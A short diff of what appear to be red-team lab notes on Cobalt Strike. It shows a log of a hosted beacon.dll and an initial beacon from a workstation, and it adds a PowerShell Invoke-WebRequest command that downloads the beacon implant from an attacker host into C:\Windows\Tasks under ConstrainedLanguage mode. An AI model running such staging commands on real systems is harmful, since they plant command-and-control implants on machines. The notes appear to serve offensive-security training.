@@ -70,7 +70,7 @@ CS confirms:
 ```
 04/21 08:09:23 *** neo hosted file /cobaltstrike/server/uploads/beacon.dll @ http://172.16.0.10:80/beacon.dll
 04/21 08:10:29 *** initial beacon from pchilds@10.10.121.108 (LON-WKSTN-1)
-```  
+```
 
 
 ---
@@ -80,6 +80,7 @@ CS confirms:
 On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:
 
 ```powershell
+cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 ```
 
